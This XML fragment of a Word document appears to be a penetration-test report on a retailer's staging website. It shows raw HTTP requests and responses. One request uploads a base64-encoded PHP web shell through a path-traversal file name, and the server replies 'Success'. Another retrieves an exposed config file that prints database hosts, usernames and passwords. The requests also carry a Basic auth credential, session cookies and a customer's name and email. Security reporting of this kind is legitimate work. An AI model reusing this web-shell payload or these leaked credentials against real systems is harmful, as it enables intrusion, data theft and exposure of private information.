      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="6B72A364" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3A0B391F" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>RECOMMEND</w:t>
            </w:r>
            <w:r w:rsidR="0056691F" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>ATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5B9B2F4E" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00AE3A4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Dời vào thư mục khác hoặc thiết lập quyền truy cập cho tệp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="340D562E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="27F32E4A" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37438335" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00F635D8" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3FEE851A" w14:textId="77777777" w:rsidTr="001B336C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7EAFF8F3" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E121DD" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="0B22AAE2" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3C7515FB" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="72D9085C" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E41FA9" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>tsconfig.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="54F1EB5E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4C026483" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007B584C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">AFFECTED </w:t>
            </w:r>
            <w:r w:rsidR="00377F6A" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="12D6C937" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00CF70A7" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>https://staging2.nguyenkimmall.com:443/tsconfig.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3DC315E0" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5FDF4B50" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="145937EC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00957D8C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00780F62" w:rsidRPr="00013A35" w14:paraId="2E7D12D1" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="002B149C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0FC25D2C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Anonymous User</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F4795C1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4848D126" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pP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327"/>
      </w:tblGrid>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Request 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /upload.php HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621414327.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621414310.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznziznzgzizizdzizlzhziznziznzgzizizdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1; gr_rt=17982ec8c2d-a3443b6d74673b0d; _gat_UA-251534152-1=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Content-Length: 126</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>fileData=PGgxPktpZXROQSBkeiBmciBIUFQgQ3liZXIgc2VjPC9oMT4KPD89YCRfR0VUWzBdYCA/Pg==&amp;fileName=../../../../images/kiett.php.orionn""</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Response 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 200 OK</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:18:53 GMT</w:t>
              <w:br/>
              <w:t>Content-Type: text/html; charset=UTF-8</w:t>
              <w:br/>
              <w:t>Content-Length: 7</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>X-Powered-By: PHP/7.0.29</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=3600</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 10:18:53 GMT</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>Success"</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Image-2021-05-19 16:32:38:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</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Request 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""GET /tsconfig.json HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621415487.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621415487.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznzizmznzrzkzdzizlzhziznzizmznzrzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>If-Modified-Since: Mon, 08 Mar 2021 07:26:21 GMT</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>""</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Response 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 304 Not Modified</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:35:44 GMT</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 09:38:44 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=180</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>{</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "read": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "123.30.128.124",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "devnk_user",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "s7jtpXQQcEnkl1C",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "devnk_db"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  },</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "write": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "171.244.26.182",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "nk_dung",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "IyZap05REPEdD",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "newnguyenkim_db_clone"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  }</w:t>
              <w:br/>
              <w:t>}"</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tr w:rsidR="0077026D" w:rsidRPr="00013A35" w14:paraId="28703786" w14:textId="77777777" w:rsidTr="00C70F9B">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2C8C75F3" w14:textId="06B14541" w:rsidR="00A20BDD" w:rsidRDefault="00A20BDD" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Image-2021-05-19 16:36:44:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F65335C" w14:textId="577279FE" w:rsidR="001B0A1E" w:rsidRPr="00013A35" w:rsidRDefault="001B0A1E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[CriticalVulnDetails.image-Image]:from-resource:maxSize(15):unprocessed]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="15"/>
      <w:bookmarkEnd w:id="19"/>
    </w:tbl>
    <w:p w14:paraId="740EE71E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11"/>
    <w:p w14:paraId="7AC56920" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="025EDAF4" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
